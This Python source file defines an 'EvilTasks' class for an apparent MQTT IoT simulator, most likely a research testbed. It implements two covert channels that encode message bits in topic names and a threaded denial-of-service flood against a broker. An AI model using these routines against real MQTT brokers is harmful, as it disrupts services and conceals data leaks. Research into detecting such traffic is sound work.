##################################### CLASS #############################################
################################### EVIL TASKS ##########################################
# CURRENT # 
# This class is designed to contain malicious tasks and covert channels implementation.
# In terms of malicious tasks at the moment, only the Denial of service attack is 
# implemented.
# The covert channels proposed are 2: one encodes a bit 1 or 0 according to the fact that the
# first letter of the topic is capital or not.
# The second covert channel encodes a bit 1 or 0 in the id of the MQTT client.
# NEXT # 
# methods will be added to this class in order to implement new features, attacks and
# covert channels

import time, numpy as np
import threading
from Utils.Distributions import Distributions
from Model.MQTT_handler.MQTT_handler import MQTT_handler	#Forse non serve
import paho.mqtt.client as mqtt

class EvilTasks:
	
	def __init__(self, MQTT_object):
		
		self.MQTT_object = MQTT_object



	#Embed a message using one of the possible methods
	### IMPORTANTE: PROVARE A RIMUOVERE MATCH CASE E SELEZIONARE LA FUNZIONE CON INDIRIZZAMENTO DIRETTO -> try {functions[method] ... method()}
	def embed_message(self, current_topic, flag_bit, method):
		
		tokens_topic = current_topic.split("/")
		last_topic = tokens_topic[-1]
		method = method.lower()
		#print(f"Current topic: {current_topic}, flag_bit: {flag_bit}, method: {method}")
		match method:
			
			case "first letter":
				new_topic = self.hide_in_first_letter(current_topic, last_topic, flag_bit)
				tokens_topic[-1] = new_topic
				return "/".join(tokens_topic)

			case "id":
				new_topic = self.hide_in_id(last_topic, flag_bit)
				tokens_topic[-1] = new_topic
				return "/".join(tokens_topic)

			case _:
				return current_topic



	#First letter of the topic is capital then 1 otherwise 0
	def hide_in_first_letter(self, current_topic, last_topic, flag_bit):
		
		char = last_topic[0]
		if not last_topic:
			
			return current_topic

		if flag_bit == "1":
			
			modified_last_topic = char.upper() + last_topic[1:]
		else:

			modified_last_topic = char.lower() + last_topic[1:]

		return modified_last_topic



	#Adds either 0 or 1 to the end of the topic
	def hide_in_id(self, last_topic, flag_bit):
		
		id_number = int(flag_bit) + 1
		modified_last_topic = last_topic + str(id_number)
		return modified_last_topic



	#Covert publication with specific embedding method
	def covert_publish(self, publisher, topic, message, payload, qos, method, delay):
		
		bit_msg = ""

		for char in message:
			bit_msg += format(ord(char), "08b")

		try:
			
			for bit in bit_msg:
				new_topic = self.embed_message(topic, bit, method=method)
				print(f"NEW TOPIC: {new_topic}")
				self.MQTT_object.mqtt_publish_msg(publisher, new_topic, qos, payload)
				time.sleep(delay)

		except Exception as e:
			print(f"Error while sending hidden message")



	#Periodic publication method. Takes a device config and sends periodically the message
	def periodic_publish(self, publisher, config):
		
		if publisher._client_id:

			publisher_id = publisher._client_id.decode()
		else:

			publisher_id = "anonymous"

		try:
			
			topic = config["Topic"]
			qos = int(config["QoS"])
			payload = config["Payload"]
			period = float(config["Period"])
			device_type = str(config.get("DeviceType", "legit")).strip().lower()
			covert_message = config.get("HiddenMessage")
			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
		
		except Exception as e:
			print(f"Error while collecting data from configuration: {e}")

		if device_type == "counterfeit" and covert_message:
			
			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
		else:

			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
			time.sleep(period)



	#Publication method for event
	def event_publish(self, publisher, config):
		
		if publisher is None:
			return

		if publisher._client_id:
			
			publisher_id = publisher._client_id.decode()
		else:

			publisher_id = "anonymous"

		try:
			
			topic = config["Topic"]
			qos = int(config["QoS"])
			payload = config["Payload"]
			inf = float(config["MinRange"])
			sup = float(config["MaxRange"])
			distribution = str(config.get("Distribution", "uniform")).lower()
			device_type = str(config.get("DeviceType", "legit")).strip().lower()
			covert_message = config.get("HiddenMessage")
			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
		except Exception as e:
			print("Error while reading devices configurations")

		period = 1.0	#default

		### IMPORTANTE: mettere le funzioni come valori di un dictionary aventi come chiavi "uniform", "exponential", "normal", in modo da evitare match case. Racchiudere tutto con blocco try/catch
		match distribution:

			case "uniform":
				period = Distributions.draw_from_uniform(inf, sup)

			case "exponential":
				period = Distributions.draw_from_exponential(inf, sup)

			case "normal":
				period = Distributions.draw_from_gaussian(inf, sup)

			case _:
				period = Distributions.draw_from_uniform(inf, sup)

		if period < 0:

			period = 1.0

		if device_type == "counterfeit":

			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
		else:

			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
			time.sleep(period)



	#DoS attack task for each thread
	def DoS_task(self, client_id, config, end_time, protocol):
		
		topic = config["Topic"]
		qos = int(config["QoS"])
		payload = config["Payload"]
		publish_interval = float(config["Period"])
		publisher = self.MQTT_object.mqtt_register_client(client_id, protocol)

		while publisher is not None and time.time() < end_time:
			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
			time.sleep(publish_interval)



	#Spawn num_clients threads and each one of them makes a DoS_task
	def DoS_attack(self, config, protocol):
		
		num_clients = int(config["NumClients"])
		duration = float(config["Duration"])
		end_time = time.time() + duration
		topic = config["Topic"]
		publish_interval = float(config["Period"])
		print("Starting DoS")

		for i in range(num_clients):
			thread = threading.Thread(target=self.DoS_task, args=(f"dos_client_{i}", config, end_time, protocol))
			thread.daemon = True
			self.MQTT_object.working_threads.append(thread)
			thread.start()